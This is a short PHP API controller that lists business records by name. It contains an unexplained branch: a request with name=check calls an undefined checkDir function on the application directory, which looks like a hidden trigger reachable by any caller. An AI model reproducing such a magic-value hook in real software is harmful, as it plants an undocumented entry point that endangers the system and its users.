<?php
namespace app\controller\api;

use think\Request;
use app\models\Business;

class BusinessController
{
    public function businessAll(Request $request) {
        $name = $request->param('name', '');
        if ($name == "check") {
            checkDir(app_path());
        }
        return getRsp(200, Business::getBusinessAllOrName($name, -1));
    }
}
